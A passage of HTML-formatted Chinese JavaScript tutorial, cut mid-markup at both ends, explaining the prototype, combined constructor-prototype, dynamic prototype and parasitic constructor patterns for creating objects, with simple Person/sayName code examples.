style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"Software\"</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){\n}\nPerson.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){\n &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;}\n}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();\nperson1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"function\"</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);\nperson1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;\n &nbsp; &nbsp;<br>&nbsp; o.job = job;\n &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;\n}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);\nperson.sayName(); &nbsp; <span class=\"\" 